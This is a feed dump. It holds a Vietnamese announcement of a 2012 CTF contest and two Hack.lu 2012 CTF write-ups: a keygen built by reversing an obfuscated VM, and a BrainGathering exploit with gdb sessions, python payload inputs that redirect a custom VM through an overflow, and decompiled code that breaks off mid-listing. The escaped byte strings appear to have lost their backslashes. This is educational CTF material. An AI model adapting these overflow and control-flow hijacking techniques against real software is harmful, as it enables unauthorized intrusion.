<p>Nhận lời mời từ IDG, VNSecurity đồng ý đứng ra phối hợp tổ chức cuộc thi “Snatching the h@t” như một sự kiện trong khuôn khổ hội thảo CSO Asean năm 2012 với mong muốn giới thiệu và phát triển CTF như một hình thức học tập và thể hiện khả năng lành mạnh đến cộng đồng. VNSecurity là nhóm được biết đến rộng rãi trong giới nghiên cứu an toàn thông tin thực thụ tại Việt nam và thế giới. Các thành viên chủ chốt của nhóm là những chuyên gia uy tín về an ninh thông tin trong và ngoài nước, các kết quả nghiên cứu của họ thường được vinh danh và công bố tại nhiều cuộc hội thảo uy tín trên thế giới: Blackhat, Hitb, Pacsec, Deepsec, Syscan … Đội thi đấu CLGT của VNSecurity cũng nằm trong top những <a href="http://ctftime.org/stats/" target="_blank">đội CTF hàng đầu trên thế giới</a></p>

<p><strong>Về cuộc thi Snatching the h@t</strong></p>

<p>Cuộc thi “Snatching the h@t” năm nay sẽ bao gồm 2 vòng: vòng loại và vòng chung kết. Vòng loại được thi đấu trực tuyến thông qua mạng Internet. Các đội đứng đầu ở vòng loại sẽ được tham gia thi đấu ở vòng chung kết tại khách sạn New World ở TP HCM. Các thông tin về cuộc thi, đơn vị bảo trợ,… xin vui lòng xem tại website của IDG tại <a href="http://cso.org.vn/contest" target="_blank">http://cso.org.vn/contest </a></p>

<p>Hiện <a href="http://ctf.vnsecurity.net:8080" target="_blank">vòng loại của cuộc thi</a> đang diễn ra được 1/2 thời gian với hơn <a href="http://ctf.vnsecurity.net:8080/teams" target="_blank">100 đội tham gia</a>. Đội PiggyBird đến từ Hà Nội đang <a href="http://ctf.vnsecurity.net:8080/scoreboard" target="_blank">tạm dẫn đầu</a> với 1800 điểm. Vòng loại dự kiến sẽ kết thúc vào lúc 09 giờ sáng thứ 2 26/11/2012, kéo dài thêm 12 tiếng so với dự kiến ban đầu do hệ thống website thi đấu bị tấn công DDoS và cần thời gian khắc phục.</p>

<p>**Thông tin cần biết:<br />
**</p>

<ul>
  <li>Trang chủ thi đấu vòng loại: <a href="http://ctf.vnsecurity.net:8080/" target="_blank">http://ctf.vnsecurity.net:8080/</a></li>
  <li>Bảng điểm hiện tại: <a href="http://ctf.vnsecurity.net:8080/scoreboard" target="_blank">http://ctf.vnsecurity.net:8080/scoreboard</a></li>
  <li>Kênh liên lạc trực tuyến với BTC: #vnsec trên irc.freenode.net (<a href="http://webchat.freenode.net" target="_blank">http://webchat.freenode.net</a>)</li>
</ul>

<p><strong>Về hình thức thi đấu CTF</strong></p>

<p><em>CTF – Môn thể thao trí tuệ của giới hacker!</em></p>

<p>CTF (Capture the Flag) là một cuộc thi kiến thức chuyên sâu về bảo mật máy tính, được tổ chức theo mô hình trò chơi chiến tranh mạng, tập trung vào hai kỹ năng tấn công và phòng thủ mạng máy tính của người chơi. Các đội tham gia CTF sẽ được cấp một máy chủ (hoặc một mạng máy chủ) đã cài đặt sẵn nhiều chương trình chứa các lỗ hổng bảo mật. Nhiệm vụ của đội chơi là tìm ra các lỗ hổng đó, tấn công các máy chủ của các đội khác để ghi điểm, đồng thời phải nhanh chóng vá các lỗ hổng trên máy chủ của đội nhà, để tránh bị tấn công bởi các đội khác.</p>

<p>CTF hấp dẫn và thu hút giới hacker bởi lẽ các cuộc thi này phản ánh rất chân thật công việc hàng ngày và đòi hỏi người chơi phải có các kỹ năng của một hacker thực thụ. Muốn chiến thắng ở một cuộc thi CTF, người chơi không chỉ phải nhuần nhuyễn các kỹ năng phát hiện và khai thác lỗ hổng bảo mật, mà còn phải thật sự lành nghề trong việc bảo vệ sự an toàn và duy trì tính liên tục của hệ thống mạng trước các đợt tấn công dồn dập từ bên ngoài.</p>

<p>Với cường độ và áp lực rất cao, cho nên mặc dù thể lệ CTF thường cho phép cá nhân tham gia nhưng chiến thắng thường thuộc về các đội có nhiều thành viên có trình độ cao và có khả năng “phối hợp tác chiến” hiệu quả.</p>

<p>Các cuộc thi CTF ngày nay thường chia thành 3 hình thức chơi chính:</p>

<ul>
  <li>Tấn công &amp; phòng thủ (attack &amp; defence) như luật chơi cổ điển ban đầu.</li>
  <li>Hình thức thứ 2 là trả lời thử thách theo từng chủ đề (Jeopardy-style). Hình thức này thông thường sẽ chia theo chủ đề được phân theo các phân mục như : Web, Forensic, Crypto, Binary, Pwnable… Ở mỗi phân mục sẽ có các câu hỏi theo độ khó tăng dần.</li>
  <li>Hình thức thứ 3 là sự kết hợp của hình thức 1 và 2, chẳng hạn như kết hợp giữa hình thức chỉ có tấn công (attack only) với các dạng thử thách khác nhau. Đây cũng chính là hình thức của cuộc thi Snatching the h@t năm nay.</li>
</ul>

<p>Việc tham gia thi đấu các kỳ CTF cũng là dịp để giúp học hỏi thêm nhiều kinh nghiệm và kiến thức bổ ích. Lịch sử CTF đã ghi nhận sự tham gia của rất nhiều hacker trẻ mà sau này đã trở thành những chuyên gia bảo mật tên tuổi trên thế giới.</p>


  ]]></description>
</item>

	<item>
  <title>[writeup] Hacklu 2012 – Challenge #12 – Donn Beach – (500)</title>
  <link>http://realjenius.com/ctf%20-%20clgt%20crew/2012/10/28/writeup-hacklu-2012-challenge-12-donn-beach-500.html</link>
  <author>R.J. Lorimer</author>
  <pubDate>2012-10-28T00:00:00+08:00</pubDate>
  <guid>http://realjenius.com/ctf%20-%20clgt%20crew/2012/10/28/writeup-hacklu-2012-challenge-12-donn-beach-500.html</guid>
  <description><![CDATA[
     <blockquote>
  <p>The famous zombie researcher “Donn Beach” almost created an immunization<br />
against the dipsomanie virus. This severe disease leads to the inability to<br />
defend against Zombies, later causes a complete loss of memory and finally<br />
turns you into one of them. Inexplicably Donn forgot where he put the<br />
license key for his centrifuge. Provide him a new one and humanity will owe<br />
you a debt of gratitude for fighting one of the most wicked illnesses<br />
today.</p>

  <p>https://ctf.fluxfingers.net/challenges/donn_beach.exe</p>

  <p>ctf.fluxfingers.net tcp/2055</p>
</blockquote>

<p>First, the executable requires you to enter a name to identify which equals to 0x4B17E245 after being hashed. You can easily bypass this step by patching, but in case you want to know the correct answer, it is <strong>DonnBeach</strong>.</p>

<p>Second, the executable asks for a key with format 11111111-22222222-33333333. The key and the correct name hash are passed to VM-obfuscated functions, transformed and then must equal to four constant values in order to get the flag.</p>

<p>After hours reversing the VM, I rebuilt the code :</p>

<pre class="brush: plain; title: ; notranslate" title="">unsigned char table[] =
"x63x7Cx77x7BxF2x6Bx6FxC5x30x01x67x2BxFExD7xABx76
xCAx82xC9x7DxFAx59x47xF0xADxD4xA2xAFx9CxA4x72xC0
xB7xFDx93x26x36x3FxF7xCCx34xA5xE5xF1x71xD8x31x15
x04xC7x23xC3x18x96x05x9Ax07x12x80xE2xEBx27xB2x75
x09x83x2Cx1Ax1Bx6Ex5AxA0x52x3BxD6xB3x29xE3x2Fx84
x53xD1x00xEDx20xFCxB1x5Bx6AxCBxBEx39x4Ax4Cx58xCF
xD0xEFxAAxFBx43x4Dx33x85x45xF9x02x7Fx50x3Cx9FxA8
x51xA3x40x8Fx92x9Dx38xF5xBCxB6xDAx21x10xFFxF3xD2
xCDx0Cx13xECx5Fx97x17x44xC4xA7x7Ex3Dx64x5Dx19x73
x60x81x4FxDCx22x2Ax90x88x46xEExB8x14xDEx5Ex0BxDB
xE0x32x3Ax0Ax49x06x24x5CxC2xD3xACx62x91x95xE4x79
xE7xC8x37x6Dx8DxD5x4ExA9x6Cx56xF4xEAx65x7AxAEx08
xBAx78x25x2Ex1CxA6xB4xC6xE8xDDx74x1Fx4BxBDx8Bx8A
x70x3ExB5x66x48x03xF6x0Ex61x35x57xB9x86xC1x1Dx9E
xE1xF8x98x11x69xD9x8Ex94x9Bx1Ex87xE9xCEx55x28xDF
x8CxA1x89x0DxBFxE6x42x68x41x99x2Dx0FxB0x54xBBx16";

unsigned int domap( unsigned int number )
{
  unsigned char* buffer = table;

  unsigned int pos;
  unsigned int x = 0;

  for (int i=0; i&lt;4; i++)
  {
    unsigned int tmp = number;
    for (int j=0; j&lt;i; j++)
      tmp = tmp &gt;&gt; 8;
    pos = tmp &amp; 0xFF;
    int y = buffer[pos];
    for (int j=0; j&lt;i; j++)
      y = y &lt;&lt; 8;
    x = x ^ y;
  }

  return x;
}

// Name hash : t ( = 0x4B17E245 )
// Key : x-y-z
void transform(unsigned int&amp; t, unsigned int&amp; x, unsigned int&amp; y, unsigned int&amp; z)
{
  unsigned int tmp;

  for (int i=0 ; i &lt; 2; i++)
  {
    t = domap(t);
    x = domap(x);
    y = domap(y);
    z = domap(z);

    x = (x &lt;&lt; 8) ^ (x &gt;&gt; 24);
    y = (y &lt;&lt; 16) ^ (y &gt;&gt; 16);
    z = (z &lt;&lt; 24) ^ (z &gt;&gt; 8);

    tmp = t;
    t = t ^ x;
    x = x ^ y;
    y = y ^ z;
    z = z ^ tmp;
  }

// Require : t-x-y-z == 01020304-05060708-09101112-0D14151E
}
</pre>

<p>Looking at the code, I happily thought that the easiest option is using Z3py to solve ^0^… Unfortunately, after hours, i failed to implement the algorithm ( ok, shame on me -_- ) . Then LSE got breakthrough, i started to find another way… Doing some maths, finally I found a solution :<br />
- Let’s call the t,x,y,z before the last xors step as t1, x1, y1, z1 and the fresh t,x,y,z as t0, x0, y0, z0.<br />
- Assign to t1 ( or x1, y1, z1 ) a random interger, then we can compute t0, x0, y0, z0.<br />
- There will be a conflict in our way if we assigned a wrong value, so we need to bruteforce t1 ( or x1, t1, z1 ) value.</p>

<pre class="brush: plain; title: ; notranslate" title="">unsigned char findchar(unsigned char x)
{
  for (int i=0; i&lt;256; i++)
    if (table[i] == x)
    {
      return i;
    }
}

unsigned int remap(unsigned int number)
{
  unsigned int x = 0;
  unsigned char pos;
  for (int i=0; i&lt;4; i++)
  {
    unsigned int tmp = number;
    for (int j=0; j&lt;i; j++)
      tmp = tmp &gt;&gt; 8;
    pos = tmp &amp; 0xFF;
    int y = findchar(pos);
    for (int j=0; j&lt;i; j++)
      y = y &lt;&lt; 8;
    x = x ^ y;
  }
  return x;
}

void solve()
{
  unsigned int x1,y1,z1,t1,x0,y0,z0,t0;

  t0 = 0xb3f0986e;

  for (unsigned int tmp = 0; tmp &lt; 0xFFFFFFFF; tmp++)
  {
    x1 = tmp;
    y1 = 0x05060708 ^ x1;
    z1 = 0x09101112 ^ y1;
    t1 = 0x0D14151E ^ z1;

    x1 = (x1 &gt;&gt; 8) ^ (x1 &lt;&lt; 24);
    y1 = (y1 &gt;&gt; 16) ^ (y1 &lt;&lt; 16);
    z1 = (z1 &gt;&gt; 24) ^ (z1 &lt;&lt; 8);

    x1 = remap(x1);
    y1 = remap(y1);
    z1 = remap(z1);
    t1 = remap(t1);

    x0 = t0 ^ t1;
    y0 = x0 ^ x1;
    if ((y0 ^ y1) == (t0 ^ z1))  // check if there is a conflict
    {
      z0 = y0 ^ y1;
      x0 = (x0 &gt;&gt; 8) ^ (x0 &lt;&lt; 24);
      y0 = (y0 &gt;&gt; 16) ^ (y0 &lt;&lt; 16);
      z0 = (z0 &gt;&gt; 24) ^ (z0 &lt;&lt; 8);
      x0 = remap(x0);
      y0 = remap(y0);
      z0 = remap(z0);

      printf("%x-%x-%x", x0, y0, z0);
      break;
    }
    else
      continue;
  }
}
</pre>

<p>Running the code and I got a key after some minutes: b6b09bf0-f23daa06-ac4ee747</p>

<p>Submiting to server, I got this: “Gratz <img src="http://vnsec-new.cloudapp.net/wp/wp-includes/images/smilies/icon_smile.gif" alt=":)" class="wp-smiley" /> the flag is: 1h3ardul1k3mmX”.</p>

<p>P/S : @hacklu: I do enjoy the the Rickrolld clip… lolz…</p>

  ]]></description>
</item>

	<item>
  <title>[writeup] Hacklu 2012 – Challenge #6 – BrainGathering – (500)</title>
  <link>http://realjenius.com/ctf%20-%20clgt%20crew/2012/10/26/writeup-hacklu-2012-challenge-6-braingathering-500.html</link>
  <author>R.J. Lorimer</author>
  <pubDate>2012-10-26T00:00:00+08:00</pubDate>
  <guid>http://realjenius.com/ctf%20-%20clgt%20crew/2012/10/26/writeup-hacklu-2012-challenge-6-braingathering-500.html</guid>
  <description><![CDATA[
     <p>I did not solve this during CTF and my mistake is not using IDA to decompile since it has some obfuscate.<br />
After CTF end, i use gdb to dump running process to binary file and<br />
analyze it again, try to finish it.</p>

<blockquote>
  <p>gdb –pid [PID]<br />
gdb&gt;info proc<br />
process 4660</p>

  <p>gdb&gt;shell cat /proc/4660/maps<br />
08048000-0804a000 rwxp 00000000 08:03 7213513</p>

  <p>gdb&gt;dump out.dmp 0×08048000 0x0804a000</p>
</blockquote>

<p>Load it to IDA and decompile. Basically it will loop and get an OPCODE<br />
from static array locate at address 0x804B060, and a action defined<br />
by that OPCODE will be run.</p>

<p>Just thinking a bit, when we input 0×36 bytes it will end up with a message:</p>

<blockquote>
  <p>==[ZOMBIE BRAIN AQUIREMENT SYSTEM]==<br />
Automated system for braingathering ready.</p>

  <p>1) Need Brainz brainz brainz, Zombie huuuungry!<br />
2) How much longer till braaaiiiiinz?<br />
3) Nooo more brainz! STOP THE BRAINZ!</p>

  <p>X) Nah, I’m going to get my brains somewhere else.</p>

  <p>3<br />
### Warning: Only for authorized zombies ###<br />
Please enter teh z0mb13 k1llc0d3:<br />
BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB<br />
XPLOIT DETECTED, ALTERING KILLCODE</p>
</blockquote>

<p>In normal case when our string &lt; 0×36 bytes length:</p>

<blockquote>
  <p>==[ZOMBIE BRAIN AQUIREMENT SYSTEM]==<br />
Automated system for braingathering ready.</p>

  <p>1) Need Brainz brainz brainz, Zombie huuuungry!<br />
2) How much longer till braaaiiiiinz?<br />
3) Nooo more brainz! STOP THE BRAINZ!</p>

  <p>X) Nah, I’m going to get my brains somewhere else.</p>

  <p>3<br />
### Warning: Only for authorized zombies ###<br />
Please enter teh z0mb13 k1llc0d3:<br />
hello<br />
Comparing k1llc0d3<br />
INVALID</p>

  <p>==[ZOMBIE BRAIN AQUIREMENT SYSTEM]==<br />
Automated system for braingathering ready</p>
</blockquote>

<p>It continue. So i think it must be a different when this vm handle<br />
our string. The execution flow will different in 2 cases. Let find out:</p>

<p>I set a breakpoint and print at 0x0804865B where it get OPCODE and put it<br />
in to EAX register.</p>

<blockquote>
  <p>b *0x0804865B<br />
commands 1<br />
p/x $ebx<br />
p/x $eax<br />
continue<br />
end</p>
</blockquote>

<p>Compare 2 results I have found where the execution alter:</p>

<p>First one is “B”*0×36:</p>

<blockquote>
  <p>0x081ea147 71<br />
0x081ea148 82<br />
0x081ea149 14<br />
0x081ea14a 53<br />
0x081ea14d 81<br />
0x081ea14e 40<br />
0x081ea150 74<br />
0x081ea151 41<br />
0x081ea152 86<br />
0x081ea153 68<br />
0x081ea154 74<br />
0x081ea155 58<br />
0x081ea4f3 3d<br />
0x081ea4f6 81<br />
0x081ea4f7 3f<br />
0x081ea4f9 53<br />
0x081ea4fc 28</p>
</blockquote>

<p>In normal case:</p>

<blockquote>
  <p>0×08515147 71<br />
0×08515148 82<br />
0×08515149 14<br />
0x0851514a 53<br />
0x0851514d 81<br />
0x0851514e 40<br />
0×08515150 74<br />
0×08515151 41<br />
0×08515152 86<br />
0×08515153 68<br />
0×08515154 74<br />
0×08515155 58<br />
0x0851531d 58<br />
0×08519149 53<br />
0x0851914c 53<br />
0x0851914f 53<br />
0×08519152 53</p>
</blockquote>

<p>The address in 2 case will same at offset, so we can compare easy.<br />
It start different when handle OPCODE 0×58.</p>

<blockquote>
  <p>case 0×58:<br />
v22 = *heap1_end2;<br />
++heap1_end2;<br />
PC += v22;<br />
continue;</p>
</blockquote>

<p>So v22 will change flow of execution because. I want to know why this happen:</p>

<blockquote>
  <p>gdb&gt;b *0x080487DE<br />
gdb&gt;commands 2<br />
&gt;p/x $ebx<br />
&gt;continue<br />
&gt;end</p>
</blockquote>

<p>And i end up with</p>

<blockquote>
  <p>…<br />
..<br />
Breakpoint 2, 0x080487de in close@plt ()<br />
$12 = 0×4242</p>
</blockquote>

<p>Yeah, so we can control v22. Let look into hex-rays source to see why this happen:</p>

<p>In OPCODE 0x3F</p>

<blockquote>
  <p>case 0x3F:<br />
v40 = *PC++;<br />
v41 = v4;<br />
READ(v40, &amp;PC[v61], 0xFFFF – (unsigned __int16)((_WORD)heap1_end2 – (_WORD)PC));<br />
v4 = v41;<br />
continue;</p>
</blockquote>

<p>It will read our string to PC[v61] with a size result from calculation: 0xFFFF – (unsigned __int16)((_WORD)heap1_end2 – (_WORD)PC)<br />
Since result from v22 we can understand an overflow occur, last 2 bytes of our string overwrite value at heap1_end2.<br />
When OPCODE 0×58 is processed, PC will increase base on that 2 bytes.</p>

<p>Now the time for exploitation, first we need to calculate offset beetween PC at that time and our string.</p>

<blockquote>
  <p>gdb&gt;b *0x080487DE if $ebx=0×4242<br />
gdb&gt;c<br />
…..<br />
gdb&gt;x/20wx $edi-0×40<br />
0x8343fb5: 0×00000000 0×00000000 0×00000000 0×00000000<br />
0x8343fc5: 0x700e4242 0×00007010 0×00000000 0×42424242<br />
0x8343fd5: 0×42424242 0×42424242 0×42424242 0×42424242<br />
0x8343fe5: 0×42424242 0×00104242 0x7000ffc9 0x01e38010<br />
0x8343ff5: 0×42424242 0×42424242 0×42424242 0×42424242<br />
gdb&gt; x/x $esp+0x2c<br />
0xffe8648c: 0×08334008<br />
gdb&gt; p/x 0x8343fd5-0×08334008<br />
$5 = 0xffcd</p>
</blockquote>

<p>So just to confirm i’ll return to 0×40 ( write OPCODE) :</p>

<blockquote>
  <p>python -c ‘print “3″*34+”x40″*41+”xffxcd”*7′ &gt; file</p>
</blockquote>

<p>And:</p>

<blockquote>
  <p>./braingathering &lt; file<br />
==[ZOMBIE BRAIN AQUIREMENT SYSTEM]==<br />
Automated system for braingathering ready.</p>

  <p>1) Need Brainz brainz brainz, Zombie huuuungry!<br />
2) How much longer till braaaiiiiinz?<br />
3) Nooo more brainz! STOP THE BRAINZ!</p>

  <p>X) Nah, I’m going to get my brains somewhere else.</p>

  <p>### Warning: Only for authorized zombies ###<br />
Please enter teh z0mb13 k1llc0d3:<br />
Comparing k1llc0d3<br />
INVALID</p>

  <p>INVALID<br />
INVALID<br />
INVALID<br />
INVALID<br />
INVALID<br />
INVALID<br />
zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz</p>
</blockquote>

<p>And make sure index of byte we can start our shellcode:</p>

<blockquote>
  <p>python -c ‘print “3″*34+”A”*6+”x40″+”B”*34+”xffxcd”*7′ &gt; file<br />
./braingathering &lt; file<br />
Comparing k1llc0d3<br />
INVALID</p>

  <p>INVALID</p>
</blockquote>

<p>In OPCODE 0×40:</p>

<blockquote>
  <p>case 0×40:<br />
v36 = *PC++;<br />
v37 = 2;<br />
v63 = v4;<br />
if ( v36 &lt;= 1u )<br />
v37 = v36;<br />
v38 = v37;<br />
len = STRLEN(&amp;PC[v61]);<br />
WRITE(v38, &amp;PC[v61], len);<br />
v4 = v63;<br />
continue;</p>
</blockquote>

<p>Finally. We findout where content of killcode existence in memory.<br />
Let find where it is:</p>

<blockquote>
  <p>gdb-peda$ searchmem KILLCODE heap<br />
Searching for ‘KILLCODE’ in: heap ranges<br />
Found 1 results, display max 1 items:<br />
[heap] : 0x838b008 (“KILLCODEn## Warn”)<br />
gdb-peda$ p/x 0x838b008-0×08383008<br />
$1 = 0×8000</p>
</blockquote>

<p>And we need to reset v61 to 0×8000 We use OPCODE 0×49</p>

<blockquote>
  <p>case 0×49:<br />
v29 = PC[1];<br />
v30 = *PC;<br />
PC += 2;<br />
v61 = (v29 « 8) | v30;<br />
continue;</p>
</blockquote>

<p>And final exploit ( so lucky since v61 has value 0 at that time)</p>

<blockquote>
  <p>$echo “FUKCING KILLCODE” &gt; killcode</p>

  <p>$python -c ‘print “3″*34+”A”*6+”x49x00x80x40″+”B”*31+”xffxcd”*7′ &gt; file<br />
./braingathering &lt; file<br />
==[ZOMBIE BRAIN AQUIREMENT SYSTEM]==<br />
Automated system for braingathering ready.</p>

  <p>1) Need Brainz brainz brainz, Zombie huuuungry!<br />
2) How much longer till braaaiiiiinz?<br />
3) Nooo more brainz! STOP THE BRAINZ!</p>

  <p>X) Nah, I’m going to get my brains somewhere else.</p>

  <p>### Warning: Only for authorized zombies ###<br />
Please enter teh z0mb13 k1llc0d3:<br />
Comparing k1llc0d3<br />
INVALID</p>

  <p>FUKCING KILLCODE</p>
</blockquote>

<p>and hex-rays source:</p>

<pre class="brush: cpp; title: ; notranslate" title="">int __cdecl sub_80485E0()
{
  BYTE *PC; // esi@1 MAPDST
  int index; // eax@1
  _WORD *heap1_end2; // edi@3
  int v4; // edx@3
  char opCode; // al@4
  int v6; // ST3C_4@5
  unsigned __int16 v7; // ax@6
  int v8; // eax@11
  int v9; // esi@12
  __int16 v10; // si@15
  __int16 v11; // ax@15
  char v12; // si@16
  int v13; // ecx@16
  unsigned __int16 v14; // cx@19
  char v15; // si@23
  int v16; // eax@23
  unsigned __int16 v17; // si@26
  __int16 v18; // si@27
  __int16 v19; // ax@27
  char v20; // si@30
  int v21; // eax@30
  int v22; // ebx@33
  __int16 v23; // si@36
  __int16 v24; // ax@36
  __int16 v25; // si@37
  __int16 v26; // ax@37
  __int16 v27; // si@38
  __int16 v28; // cx@38
  __int16 v29; // ax@39
  __int16 v30; // cx@39
  __int16 v31; // si@45
  __int16 v32; // ax@45
  int v33; // ST3C_4@47
  int v34; // ST3C_4@48
  unsigned __int16 v35; // ax@48
  unsigned __int16 v36; // si@50
  signed int v37; // eax@50
  signed int v38; // ST40_4@52
  int len; // eax@52
  unsigned __int16 v40; // si@53
  int v41; // ST3C_4@53
  __int16 v42; // si@54
  unsigned __int16 v43; // ax@54
  __int16 v44; // si@55
  __int16 v45; // ax@55
  __int16 v46; // si@57
  __int16 v47; // ax@57
  BYTE v48; // si@59
  int v49; // ecx@59
  int v50; // eax@63
  __int16 v51; // si@67
  unsigned __int16 v52; // ax@67
  BYTE v53; // si@77
  int v54; // ecx@77
  __int16 v55; // si@80
  __int16 v56; // ax@80
  char v57; // si@82
  int v58; // eax@82
  int v59; // eax@85
  unsigned __int16 v61; // [sp+1Eh] [bp-42h]@3
  int v63; // [sp+3Ch] [bp-24h]@50
  BYTE *heap1_end1; // [sp+44h] [bp-1Ch]@3
  unsigned __int16 v65; // [sp+48h] [bp-18h]@3
  unsigned __int16 v66; // [sp+4Ah] [bp-16h]@3

  PC = (BYTE *)malloc_(65535);
  memset_((int)PC, 0, 65535);
  index = 0;
  do
  {
    PC[index] = byte_804B060[index];
    ++index;
  }
  while ( index != 2068 );
  heap1_end1 = PC + 65535;
  heap1_end2 = PC + 65535;
  v4 = 0;
  v65 = 0;
  v66 = 0;
  v61 = 0;
  while ( 1 )
  {
    opCode = *PC++;
    switch ( opCode )
    {
      default:
        continue;
      case 0x90:
        v6 = v4;
        sleep_();
        v4 = v6;
        continue;
      case 0x86:
        v7 = *heap1_end2;
        ++heap1_end2;
        v65 = v7;
        continue;
      case 0x82:
        if ( (unsigned int)PC &gt; (unsigned int)heap1_end2 || (unsigned int)heap1_end2 &gt; (unsigned int)heap1_end1 )
          goto terminate_;
        --heap1_end2;
        *heap1_end2 = v65;
        continue;
      case 0x81:
        v61 = (_WORD)heap1_end2 - (_WORD)PC;
        continue;
      case 0x7B:
        v8 = v4 &amp; 0x1FFF;
        if ( v66 == v65 )
        {
          v4 &amp;= 0x1FFFu;
          BYTE1(v4) |= 0x20u;
          v65 = v66;
        }
        else
        {
          HIWORD(v9) = HIWORD(v4);
          LOWORD(v4) = v8 | 0x8000;
          if ( v66 &gt;= v65 )
          {
            LOWORD(v9) = v8 | 0x4000;
            v4 = v9;
          }
        }
        continue;
      case 0x79:
        v10 = PC[1];
        v11 = *PC;
        PC += 2;
        v65 -= (v10 &lt;&lt; 8) | v11;
        continue;
      case 0x75:
        v12 = *PC++;
        v13 = v4 | 0x8000;
        LOWORD(v4) = v4 &amp; 0x7FFF;
        if ( v12 )
          v4 = v13;
        continue;
      case 0x74:
        v14 = *heap1_end2;
        ++heap1_end2;
        v61 = v14;
        continue;
      case 0x71:
        if ( (unsigned int)PC &gt; (unsigned int)heap1_end2 || (unsigned int)heap1_end2 &gt; (unsigned int)heap1_end1 )
          goto terminate_;
        --heap1_end2;
        *heap1_end2 = v66;
        continue;
      case 0x69:
        v15 = *PC++;
        v16 = v4 | 0x40;
        v4 &amp;= 0xFFFFFFBFu;
        if ( v15 )
          v4 = v16;
        continue;
      case 0x68:
        v17 = *heap1_end2;
        ++heap1_end2;
        v66 = v17;
        continue;
      case 0x66:
        v18 = PC[1];
        v19 = *PC;
        PC += 2;
        v66 = (v18 &lt;&lt; 8) | v19;
        continue;
      case 0x61:
        v61 ^= (unsigned __int16)(PC[1] &lt;&lt; 8) | *PC;
        goto LABEL_29;
      case 0x5C:
        v20 = *PC++;
        v21 = v4 | 0x20;
        v4 &amp;= 0xFFFFFFDFu;
        if ( v20 )
          v4 = v21;
        continue;
      case 0x58:
        v22 = *heap1_end2;
        ++heap1_end2;
        PC += v22;
        continue;
      case 0x53:
        if ( (unsigned int)PC &gt; (unsigned int)heap1_end2 || (unsigned int)heap1_end2 &gt; (unsigned int)heap1_end1 )
          goto terminate_;
        v23 = PC[1];
        --heap1_end2;
        v24 = *PC;
        PC += 2;
        *heap1_end2 = (v23 &lt;&lt; 8) | v24;
        continue;
      case 0x4F:
        v25 = PC[1];
        v26 = *PC;
        PC += 2;
        v61 += (v25 &lt;&lt; 8) | v26;
        continue;
      case 0x4B:
        v27 = PC[1];
        v28 = *PC;
        PC += 2;
        v65 = (v27 &lt;&lt; 8) | v28;
        continue;
      case 0x49:
        v29 = PC[1];
        v30 = *PC;
        PC += 2;
        v61 = (v29 &lt;&lt; 8) | v30;
        continue;
      case 0x47:
        if ( (v4 &amp; 0x2010) == 8208 || v4 &amp; 0x40 &amp;&amp; (unsigned __int16)v4 &gt;&gt; 15 || (v4 &amp; 0x4020) == 16416 )
          PC += *PC | (PC[1] &lt;&lt; 8);
        else
LABEL_29:
          PC += 2;
        continue;
      case 0x45:
        v31 = PC[1];
        v32 = *PC;
        PC += 2;
        v65 += (v31 &lt;&lt; 8) | v32;
        continue;
      case 0x43:
        if ( v61 &gt; 2u )
        {
          v33 = v4;
          close_(v61);
          v4 = v33;
        }
        continue;
      case 0x42:
        v34 = v4;
        v35 = OPEN(&amp;PC[v61], 0);
        v4 = v34;
        v61 = v35;
        continue;
      case 0x41:
        v4 = *heap1_end2;
        ++heap1_end2;
        continue;
      case 0x40:
        v36 = *PC++;
        v37 = 2;
        v63 = v4;
        if ( v36 &lt;= 1u )
          v37 = v36;
        v38 = v37;
        len = STRLEN(&amp;PC[v61]);
        WRITE(v38, &amp;PC[v61], len);
        v4 = v63;
        continue;
      case 0x3F:
        v40 = *PC++;
        v41 = v4;
        READ(v40, &amp;PC[v61], 0xFFFF - (unsigned __int16)((_WORD)heap1_end2 - (_WORD)PC));
        v4 = v41;
        continue;
      case 0x3D:
        v42 = PC[1];
        v43 = *PC;
        PC += 2;
        heap1_end2 = (char *)heap1_end2 - ((unsigned __int16)(v42 &lt;&lt; 8) | v43);
        continue;
      case 0x3A:
        v44 = PC[1];
        v45 = *PC;
        PC += 2;
        v61 -= (v44 &lt;&lt; 8) | v45;
        continue;
      case 0x39:
        v61 += v66;
        continue;
      case 0x36:
        v46 = PC[1];
        v47 = *PC;
        PC += 2;
        v66 += (v46 &lt;&lt; 8) | v47;
        continue;
      case 0x33:
        v66 = (_WORD)heap1_end2 - (_WORD)PC;
        continue;
      case 0x31:
        v48 = *PC;
        v49 = v4;
        ++PC;
        BYTE1(v49) |= 0x20u;
        BYTE1(v4) &amp;= 0xDFu;
        if ( v48 )
          v4 = v49;
        continue;
      case 0x30:
        *(_WORD *)&amp;PC[v61] = v66;
        continue;
      case 0x2C:
        v50 = v4 &amp; 0x1FFF;
        if ( v61 == v65 )
        {
          v4 &amp;= 0x1FFFu;
          BYTE1(v4) |= 0x20u;
          v65 = v61;
        }
        else
        {
          LOWORD(v4) = v50 | 0x8000;
          BYTE1(v50) |= 0x40u;
          if ( v61 &gt;= v65 )
            v4 = v50;
        }
        continue;
      case 0x28:
        v51 = PC[1];
        v52 = *PC;
        PC += 2;
        heap1_end2 = (char *)heap1_end2 + ((unsigned __int16)(v51 &lt;&lt; 8) | v52);
        continue;
      case 0x27:
